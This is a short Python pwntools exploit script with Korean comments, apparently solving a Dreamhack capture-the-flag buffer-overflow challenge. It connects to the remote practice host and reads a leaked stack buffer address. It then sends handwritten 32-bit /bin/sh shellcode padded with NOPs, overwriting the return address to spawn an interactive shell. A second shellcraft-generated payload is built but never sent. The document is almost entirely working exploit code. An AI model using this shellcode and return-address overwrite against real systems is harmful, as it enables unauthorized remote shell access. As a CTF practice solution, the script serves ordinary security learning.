from pwn import *

context.log_level = 'debug' #로그 확이
context.arch = 'i386'   #32비트

p = remote("host8.dreamhack.games", 16183)

p.recvuntil("buf = (")
buf = int(p.recv(10),16)    #바이트 주소로 온것을 16진수 정수형 으로 변환

code = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80" #제가 짠 쉘코드

payload = code  #쉘코드 
payload += b"\x90" * (0x84-len(code)) # 0x80 + 0x4라는 총 크기에서 쉘 코드 길이 뺀 만큼 NOP로 채움
payload += p32(buf) #buf 주소로 리턴 주소 덮어쓰기


sc = shellcraft.sh() #어셈블리어 쉘코드 생성
shellcode = asm(sc)  #어셈블리어 -> 바이트코드 변환

payload2 = shellcode
payload2 += b"\x90" * (0x84-len(shellcode))
payload2 += p32(buf)

p.sendline(payload)
p.interactive()
